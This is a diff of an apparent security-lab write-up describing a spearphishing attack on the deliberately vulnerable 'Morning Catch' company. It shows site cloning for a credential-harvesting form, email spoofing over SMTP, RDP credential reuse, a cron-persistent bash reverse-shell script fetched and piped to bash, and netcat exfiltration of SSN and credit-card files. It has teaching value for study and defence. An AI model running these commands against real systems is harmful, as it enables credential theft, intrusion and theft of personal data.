@@ -6,7 +6,7 @@
 
 This laboratory describes a Spearphishing attack to a company CEO with the purpose of stealing credentials, accessing the system and then stealing sensitive information for Double Extortion.
 
-**Threat model:** attacker has access to the network from the inside.
+**Threat model:** adversary with access to the private internal network of the company.
 
 ### Prerequisites
 
@@ -51,7 +51,7 @@ ClientConn: 192.168	0
 #### Tools
 
 * `nmap`: to discover the network
-* `wget`: to clone login website
+* `wget`: to clone the website
 * `apache2`: to host the fake website
 * `telnet`: to craft and send the fake email
 * `rdesktop`: to connect to the RDP service
@@ -66,7 +66,7 @@ ClientConn: 192.168	0
 
 #### 1.1. Reconnaissance and Discovery
 
-The attacker firstly can use `nmap` to gain knowledge about the network and understand possible vulnerable services of the target company "*Morning Catch - Phishing Industries*".
+The attacker firstly can use `nmap` to gain knowledge about the network, like possible vulnerable services of the target host "Morning Catch - Phishing Industries".
 
     Nmap scan report for <Victim IP>
     Host is up (0.0049s latency).
@@ -84,30 +84,29 @@ There's an open connection on HTTP (the website), open connection for SMTP (will
 
 The attacker explores the website of the of Morning Catch on `http://morningcatch.ph`. There there is the list of contacts of the company directory.
 
-<img src="images/web.png" alt="web " style="zoom:50%;" />
+<img src="images/web.png" alt="web " style="zoom:35%;" />
 
-Great! Now they know the CEO's mail and the one of the System Administrator, which will be use later in the attack.
+Great! Now the attacker knows the mail of the CEO (our target) and the one of the System Administrator, which will be use later to impersonate him.
 
 By clicking "Employee login" , there's also a login page to access the corporate Mail. 
 
-<img src="images/login.png" alt="Screenshot 2025-06-06 alle 18.57.17 " style="zoom:50%;" />
+<img src="images/login.png" alt="form " style="zoom:35%;" />
 
-The idea for realizing the first phase is to clone the entire website and create a fake form that will steal the credentials. 
+The idea for realizing the first phase is to clone the entire website and create a fake form that will steal the credentials; then send a link to the website to the CEO by impersonating the System Administrator to fool him.
 
 #### 1.2. Cloning
 
-The attacker firstly clones the entire Morning Catch website, using `wget`. Then all is moved to the root directory of Apache.
+The attacker firstly clones the entire Morning Catch website, using `wget`. This command downloads all the web resources of the company website, making the dependencies local. Then all is moved to the root directory of Apache.
 
 ```bash
 wget -r -k -p morningcatch.ph
 sudo mv morningcatch.ph/* /var/www/html
 ```
 
-This command downloads all the web resources of the company website, making the dependencies local.
-
-The attacker then clones the web login page to access mail of Morning Catch. This will allow for the `mail` directory to be created, so the url of the login form will be more similar to the original one. 
+The attacker then clones the web login page to access mail of Morning Catch separetly. This will allow for the `mail` directory to be created, so the url of the login form will be more similar to the original one. 
 
 ```bash
+rm /var/www/html/mail
 wget -r -k -p morningcatch/mail/
 sudo mv morningcatch.ph/mail /var/www/html
 ```
@@ -118,12 +117,27 @@ The attacker modifies, in the `mail/index.html` file, the form action element fr
 
 ```bash
 sudo nano /var/www/html/mail/index.html
+```
+
+Old post element:
+
+```html
+<form name="form" action="index.html" method="post">
+```
+
+New post element:
+
+```html
+<form name="form" action="form.php" method="post">
+```
+
+Then the attacker adds to the directory the html file `task-mail`, that will be loaded after inserting the credentials, showing an "Under construction" message to reduce immediate suspicion.
+
+```bash
 sudo cp task-mail /var/www/html/mail
 ```
 
-The second line adds to the directory the html file `task-mail`, that will be loaded after inserting the credentials, showing a "Under construction message" to reduce immediate suspicion.
-
-The `form.php` needs to:
+Therefore the `form.php` needs to:
 
 *  save the form inputs in `creds.txt`,
 * redirect to `task-mail`.
@@ -162,7 +176,7 @@ Now the website is on, ready to steal some credentials!
 
 #### 1.4. Sending the message
 
-The attacker crafts the email for the target, by connecting to the SMTP server (identified earlier with `nmap`) using `telnet`. 
+The attacker connects to the SMTP server (identified earlier with `nmap`) using `telnet`. This sequence SMTP commands crafts and sends an email from the system administrator of the company  (Boyd Jenius)  to the CEO (Richard Bourne). The url redirects to the fake login page (hosted on the attacker's machine). 
 
 ```bash
 telnet morningcatch.ph 25
@@ -188,9 +202,7 @@ Boyd
 quit
 ```
 
-This sequence of SMTP commands crafts and sends an email from the system administrator of the company to the CEO, redirecting him to the fake login page (hosted on the attacker's machine). 
-
-This spoofing step is possible due to the vulnerable Sendmail server, configured to allow unauthenticated relaying from internal network addresses.
+**Note:** this spoofing step is possible due to the vulnerable Sendmail server, configured to allow unauthenticated relaying from internal network addresses.
 
 ###### Richard POV
 
@@ -198,37 +210,37 @@ Richard Bourn checks his email and receives the message (from the real Boyd Jeni
 
 <img src="images/mail.png" alt="Screenshot 2025-06-06 alle 18.43.04 " style="zoom:50%;" />
 
-Then Richard enters the username and password, that we can find in the `creds.txt` file. Threat escalated!
+Then Richard enters the username and password, that we can find in the `creds.txt` file. Now we know his credentials: threat escalated!
 
 <img src="images/cred.png" alt="Screenshot 2025-06-08 alle 17.12.42 " style="zoom:50%;" />
 
 ### Phase 2: Execution and Exfiltration
 
-**Objective:** steal sensitive material from the CEO machine.
+**Objective:** get inside the CEO's machine and steal sensitive material.
 
 #### 2.1. Exploring Richard's Machine
 
-Now that the attacker has the CEO's credentials, they can try to reuse them (Credential Stuffing) for accessing other services. In particular the `ms-wbt-server` (identified earlier with `nmap`), which is the service name used by the Remote Desktop Protocol (RDP).
+Now that the attacker has the Richard's credentials, they can try to reuse them (Credential Stuffing) for accessing other services. In particular the `ms-wbt-server` (identified earlier with `nmap`), which is the service name used by the Remote Desktop Protocol (RDP).
 
-Firstly the attacker authenticates as Richard Bourne:
+Firstly the attacker authenticates as Richard Bourne, using `rdesktop`. The `morningcatch.ph` name on the attacker machine resolves the victim's IP.
 
 ```bash
 rdesktop -u rbourne -p password morningcatch.ph
 ```
 
-The `morningcatch.ph` name on the attacker machine resolves the victim's IP. The credentials are valid and he's inside the CEO's desktop environment.
+The credentials are valid and he's inside the CEO's desktop environment.
 
-<img src="images/rdp.png" alt="Screenshot 2025-06-07 alle 09.10.12 " style="zoom:50%;" />
+<img src="images/rdp.png" alt="Screenshot 2025-06-07 alle 09.10.12 " style="zoom:40%;" />
 
-The attacker explores common user directories, and finds 2 interesting CSV files, `company_picnic.csv` and `customers.csv`. They both contain interesting sensible information, in particular: the first contains the social security number of all the company employees and the second the credit card number and type of all 9000 customers of the company. It would be a shame if this data got leaked.
+The attacker explores common user directories, and finds 2 interesting CSV files, `company_picnic.csv` and `customers.csv`. They both contain sensitive information, in particular: the first contains the social security number of all the company employees and the second the credit card number and type of all 9000 customers of the company. It would be a shame if this data got leaked.
 
 <img src="images/files.png" alt="Screenshot 2025-06-07 alle 09.16.28  " style="zoom:50%;" />
 
-The attacker decides to steal these files, which could be done directly with RDP. However, to gain a better position, the attacker tries to obtain a reverse shell on the victim machine and use that for the exfiltration step.
+The attacker decides to steal these files, which could be done directly with RDP. However, to gain a better position, the attacker tries to obtain a reverse shell on the victim machine and use that for the exfiltration step. In particular, if the attacker successfully obtains persistence, he can access Richard's machine even if he changes his password.
 
 #### 2.2. Reverse Shell with Persistence
 
-The attacker has written `innocent.sh`, a script that spawns the reverse shell and mantains access, since the code to be executed is also saved as a scheduled task using `cron`.
+The attacker has written `innocent.sh`, a script that spawns the reverse shell and mantains access using `cron`.
 
 ```bash
 #!/bin/bash
@@ -240,33 +252,33 @@ SAFETYCOM="/bin/bash -c 'bash -i >& /dev/tcp/mornincatch.ph/4444 0>&1'"
 eval "$SAFETYCOM"
 ```
 
-* `SAFETYCOM` is the command that spawns the reverse shell;
-* this command is both saved in the crontab and executed at the end of the script;
-* the errors of the crontab are ignored to avoid leaving any obvious traces;
-* cronjob is executed at every reboot of the system, after waiting 200 seconds (for giving the system time to set up propely).
-* the cronjob will be executed with the privileges of the user that executes `innocent.sh`
+* `SAFETYCOM`  is the command that spawns an interactive shell, redirecting stdin and stdout through a TCP connection to the attacker, thus creating a reverse shell.
+* This command is both saved in the crontab and executed at the end of the script;
+* The errors of the crontab are ignored to avoid leaving any obvious traces;
+* The cronjob is executed at every reboot of the system, after waiting 200 seconds (for giving the system time to set up propely).
 
-On the attacker machine:
+**Note:** the cronjob will be executed with the privileges of the user that executes `innocent.sh`.
+
+On the attacker machine: the script is added to the root directory of Apache and then the attacker opens a listener with `netcat`. 
 
 ```bash
 sudo cp innocent.sh /var/www/html
-sudo chmod +r /var/www/html/innocent.sh
 nc -lvnp 4444
 ```
 
-This will allow the victime to download the script via HTTP. With `netcat`  the attacker can listen to connection for the reverse shell.
+This will allow the victime to download the script via HTTP.  When he will execute it, he will connect to the listener and the reverse shell will be obtained.
 
-From the victim terminal (to which the attacker has access to thanks to RDP), the attacker:
+From the victim terminal (to which the attacker has access to, thanks to RDP), the attacker:
 
-* triest to authenticate as `root` with CEO's credentials (they work!)
-* loads the script and executes it.
+* tries to authenticate as `root` with Richard's credentials for Privilege Escalation (they work!),
+* downloads the script quietly and executes it.
 
 ```bash
 su root
 wget -qO- http://mornincatch.ph/innocent.sh | bash
 ```
 
-They successfully have a remote shell with `root` privileges that's persistent to reboots!
+The attacker has successfully obtained a remote shell with `root` privileges that's persists across reboots!
 
 <img src="images/root.png" alt="Screenshot 2025-06-08 alle 15.40.13 " style="zoom:50%;" />
 
@@ -279,13 +291,13 @@ Finally, the attacker steals the interesting files with `netcat`.
 The attacker opens a new listener on a different port to receive data.
 
 ```bash
-nc -lvnp 1234 > /home/kali/customers.csv
+nc -lvnp 1234 > customers.csv
 ```
 
 On the terminal of the victim, through the reverse shell:
 
 ```bash
-cat /home/rbourne/Documents/customers.csv | nc mornincatch.ph 1234
+cat Documents/customers.csv | nc mornincatch.ph 1234
 ```
 
 The `mornincatch.ph` name on the victim machine resolves the attacker's IP. The attacker does the same with `company_picnic.csv`. 
